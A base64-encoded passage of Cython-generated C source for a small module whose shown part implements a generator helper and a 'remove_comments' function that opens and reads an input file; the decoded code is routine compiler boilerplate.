l4X1hERUNSRUYoX19weXhfcik7XG4gIF9fcHl4X3RfMSA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTtcbiAgX19weXhfdF8zID0gX19weXhfYnVpbHRpbl9yYW5nZTsgXG4gIF9fcHl4X3RfNCA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF92X2xlbmd0aH07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8zLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgyLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIH1cbiAgX19weXhfdF8zID0gX19weXhfcGZfMm5xXzJnd19nZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzIgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF8zID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8sIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF9yID0gX19weXhfdF8zO1xuICBfX3B5eF90XzMgPSAwO1xuICBnb3RvIF9fcHl4X0wwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygibnEuZ3ciLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ybnFfMmd3XzJnZW5lcmF0b3IxKTtcbiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5xXzVyZW1vdmVfY29tbWVudHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5xXzVyZW1vdmVfY29tbWVudHMgPSB7InJlbW92ZV9jb21tZW50cyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMm5xXzVyZW1vdmVfY29tbWVudHMsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJucV81cmVtb3ZlX2NvbW1lbnRzKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaW5wdXRfZmlsZSA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X291dHB1dF9maWxlID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZW1vdmVfY29tbWVudHMgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lucHV0X2ZpbGUsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vdXRwdXRfZmlsZSwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJyZW1vdmVfY29tbWVudHMiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyZW1vdmVfY29tbWVudHMiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9pbnB1dF9maWxlID0gdmFsdWVzWzBdO1xuICAgIF9fcHl4X3Zfb3V0cHV0X2ZpbGUgPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyZW1vdmVfY29tbWVudHMiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyNCwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5yZW1vdmVfY29tbWVudHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ybnFfNHJlbW92ZV9jb21tZW50cyhfX3B5eF9zZWxmLCBfX3B5eF92X2lucHV0X2ZpbGUsIF9fcHl4X3Zfb3V0cHV0X2ZpbGUpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybnFfNHJlbW92ZV9jb21tZW50cyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9pbnB1dF9maWxlLCBQeU9iamVjdCAqX19weXhfdl9vdXRwdXRfZmlsZSkge1xuICBQeU9iamVjdCAqX19weXhfdl9pbnB1dF9mID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfY29udGVudCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X291dHB1dF9jb250ZW50ID0gTlVMTDtcbiAgaW50IF9fcHl4X3ZfaW5fY29tbWVudDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X291dHB1dF9mID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF80O1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTE7XG4gIGludCBfX3B5eF90XzEyO1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMTM7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJlbW92ZV9jb21tZW50cyIsIDApO1xuXG4gIFxuICAge1xuICAgIF9fcHl4X3RfMiA9IE5VTEw7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fb3Blbik7XG4gICAgX19weXhfdF8zID0gX19weXhfYnVpbHRpbl9vcGVuOyBcbiAgICBfX3B5eF90XzQgPSAxO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfaW5wdXRfZmlsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3J9O1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8zLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgzLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICB9XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF8yID0gTlVMTDtcbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9O1xuICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19weXhfdF82ID0gX19weXhfdF8zO1xuICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG4gICAgICAgICAgX19weXhfdl9pbnB1dF9mID0gX19weXhfdF82O1xuICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzEgPSBfX3B5eF92X2lucHV0X2Y7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19weXhfdF80ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDI2LCBfX3B5eF9MN19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF92X2NvbnRlbnQgPSBfX3B5eF90XzY7XG4gICAgICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0w3X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygibnEucmVtb3ZlX2NvbW1lbnRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF8xLCAmX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fcHl4X3RfMiA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzYsIF9fcHl4X3RfMSwgX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X3RfMiwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDI1LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xMSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19weXhfdF8xMiA9ICghX19weXhfdF8xMSk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTIpKSB7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzYsIF9fcHl4X3RfMSwgX19weXhfdF8zKTtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7ICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8zID0gMDsgXG4gICAgICAgICAgICBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MOV9leGNlcHRfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfOCwgX19weXhfdF85KTtcbiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICAgICAgX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfOCwgX19weXhfdF85KTtcbiAgICAgICAgX19weXhfTDEyX3RyeV9lbmQ6O1xuICAgICAgfVxuICAgIH1cbiAgICAge1xuICAgICAge1xuICAgICAgICBpZiAoX19weXhfdF81KSB7XG4gICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl